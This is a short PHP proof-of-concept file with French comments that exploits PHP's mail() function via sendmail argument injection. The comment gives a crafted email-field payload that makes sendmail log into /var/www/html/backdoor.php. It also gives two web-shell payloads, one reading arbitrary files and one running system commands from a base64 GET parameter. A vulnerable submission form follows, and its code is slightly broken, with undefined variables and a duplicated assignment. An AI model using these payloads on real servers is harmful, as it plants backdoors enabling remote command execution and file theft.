<?php 


/*************************************************************************
	* PROOF OF CONCEPT PHP MAIL 
	* Auteur Thomas Cosmar 
	* Date 25/11/2017


Ce code utilise la fonction mail de php ( phpmailer / sendmail) pour exécuter un code
et installer une backdoor.php 


Le payload : 
Dans le champ mail : on utilise la sortie de log mail pour créer le fichier de backdoor 
"attacker\" -OQueueDirectory=/tmp -X/var/www/html/backdoor.php some"@example.com
Dans le champ mesage on écrit le code php de la backdoor qui sera loggué par la fonction mail 

exmple 1 : lecture d'un fichier 
<?php $data = htmlentities(file_get_contents(base64_decode($_GET["cmd"]))); echo $data; ?>
exemple 2 : exécution d'un shell 
<?php echo "|".system(base64_decode($_GET["cmd"]))."|<br />"; ?>



/**************************************************************************/


if(isset($_POST['mail'])){

$login = $_POST['login'];
$login = $_POST['mail'];
$subject = "Test";

$message = $_POST['message'];
$headers = '';
if(mail($to, $subject, $message, $headers, $options))
 echo 'ok';
else 
echo 'done';
}


?>


<form method="POST">
	Login : <input type="text" name="login" /> <br />
	Mail : <input type="text" name="mail" /> </br />
	Message : <textarea name="message"></textarea>
	<input type="submit" value="Envoyer" />

</form>
